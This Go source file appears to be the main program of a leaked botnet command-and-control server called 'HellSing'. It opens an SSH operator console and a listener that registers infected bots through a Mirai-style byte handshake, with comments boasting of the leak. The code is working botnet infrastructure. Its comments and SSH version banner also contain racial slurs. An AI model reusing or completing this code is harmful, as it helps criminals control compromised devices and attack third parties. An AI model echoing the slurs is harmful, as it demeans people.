package main

import (
	"bytes"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	"crypto/rand"
	"crypto/rsa"

	"HellSing/Discord"
	"HellSing/cnc"
	"HellSing/config"

	"golang.org/x/crypto/ssh"
)

func main() {
	config.ReadConfig()
	Discord.Connect()
	var loggedIn bool
	var userInfo *cnc.AccountInfo
	config := &ssh.ServerConfig{
		//Define a function to run when a client attempts a password login
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			// Should use constant-time compare (or better, salt+hash) in a production setting.
			if loggedIn, userInfo = cnc.Db.TryLogin(c.User(), string(pass)); !loggedIn {
				return nil, fmt.Errorf("password rejected for %q", c.User())
			} else {
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q", c.User())
		},
		ServerVersion: "SSH-2.0-nigga balls",
	}
	keyBytes, _ := rsa.GenerateKey(rand.Reader, 2048)
	key, _ := ssh.NewSignerFromSigner(keyBytes)

	config.AddHostKey(key)
	tel, err := net.Listen("tcp", "0.0.0.0:999")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("\033[38;5;241m[\033[38;2;191;0;0mAuthority\033[38;5;241m.] [\033[38;2;191;0;0mSSH\033[38;5;241m. \033[38;2;191;0;0mC\033[38;5;241m&\033[38;2;191;0;0mC Instance Created\033[38;5;241m.]")
	go func() {
		tel1, err := net.Listen("tcp", "0.0.0.0:998")
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Println("\033[38;5;241m[\033[38;2;191;0;0mAuthority\033[38;5;241m.] [\033[38;2;191;0;0mDiscord\033[38;5;241m. \033[38;2;191;0;0mC\033[38;5;241m&\033[38;2;191;0;0mC Instance Created\033[38;5;241m.]")
		for {
			conn, err := tel1.Accept()
			if err != nil {
				break
			}
			go initialHandler(conn)
		}
	}()
	go cnc.ListenAPI()
	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
		if err != nil {
			continue
		}

		fmt.Print("\033[38;5;241m[\033[38;2;191;0;0mAuthority\033[38;5;241m.]" + fmt.Sprintf(" [\033[38;2;191;0;0mNew SSH Login \033[38;5;241m(\033[38;2;191;0;0m%s\033[38;5;241m.)\033[38;2;191;0;0m connection from %s\033[38;5;241m. (\033[38;2;191;0;0m%s\033[38;5;241m.)", sshConn.User(), sshConn.RemoteAddr().String(), string(sshConn.ClientVersion())) + "]\r\n")
		// Discard all global out-of-band Requests
		go ssh.DiscardRequests(reqs)
		// Accept all channels
		go handleChannels(chans, userInfo)
	}

	fmt.Println("ERROR: run ulimit -n 999999")
}
func handleChannels(chans <-chan ssh.NewChannel, acc *cnc.AccountInfo) {
	// Service the incoming Channel channel in go routine
	for newChannel := range chans {
		go handleChannel(newChannel, acc)
	}
}

func handleChannel(newChannel ssh.NewChannel, acc *cnc.AccountInfo) {
	// Since we're handling a shell, we expect a
	// channel type of "session". The also describes
        // Leaked by Reflect lulz
	// "x11", "direct-tcpip" and "forwarded-tcpip"
	// channel types.
	if t := newChannel.ChannelType(); t != "session" {
		newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t))
		return
	}

	// At this point, we have the opportunity to reject the client's
	// request for another logical connection
	conn, requests, err := newChannel.Accept()
	if err != nil {
		return
	}

	// Sessions have out-of-band requests such as "shell", "pty-req" and "env"
	go func() {
		for req := range requests {
			switch req.Type {
			case "shell":
				// We only accept the default shell
				// (i.e. no command in the Payload)
				if len(req.Payload) == 0 {
					req.Reply(true, nil)
				}
			}
		}
	}()
	cnc.NewAdmin(conn, acc).Handle()
}

// This is gift from AntiBots. Enjoy hoomies!

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}
	//ctOS go brrr nigga
	if bytes.Equal(buf[:l], []byte{0, 0, 0, 4}) {
		string_len := make([]byte, 1)
		l, err := conn.Read(string_len)
		if err != nil || l <= 0 {
			return
		}
		var source string
		if string_len[0] > 0 {
			source_buf := make([]byte, string_len[0])
			l, err := conn.Read(source_buf)
			if err != nil || l <= 0 {
				return
			}
			//even if niggas get the correct bytes here goes anti defacor
			source = string(source_buf)
			source = strings.ReplaceAll(source, "\r", "")
			source = strings.ReplaceAll(source, "\n", "")
			source = strings.ReplaceAll(source, "\r\n", "")
			source = strings.ReplaceAll(source, "\n\r", "")
			source = strings.ReplaceAll(source, "\033", "")
			source = strings.ReplaceAll(source, "\x1b", "")
			source = strings.ReplaceAll(source, "\t", "")
		} else {
			cnc.NewBot(conn, buf[3], "unknown.").Handle()
		}
		cnc.NewBot(conn, buf[3], source).Handle()
	}
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}
